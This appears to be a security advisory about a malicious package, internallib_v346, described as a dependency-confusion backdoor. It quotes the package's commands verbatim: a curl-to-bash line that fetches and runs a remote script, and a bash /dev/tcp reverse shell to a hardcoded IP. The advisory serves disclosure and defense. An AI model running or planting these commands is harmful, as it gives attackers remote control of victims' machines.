summary: Reverse-shell dropper in internallib_v346 fetches and executes remote bash payload
details: internallib_v346 exports a `command()` function whose body executes `curl http://10.0.56.229:8000/shell.sh | bash` (index.js line 5), fetching a shell script over plaintext HTTP from a hardcoded private IP and piping it to bash. The shipped shell.sh contains `bash -i >& /dev/tcp/10.0.56.229/443 0>&1`, opening a reverse shell to 10.0.56.229:443. Any consumer that requires this package and invokes the documented API gets remote code execution and a reverse shell on their host. The package metadata is hollow (empty author, empty description) and the name `internallib_v346` mimics an internal-looking corporate library, consistent with a dependency-confusion lure delivering a backdoor payload.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
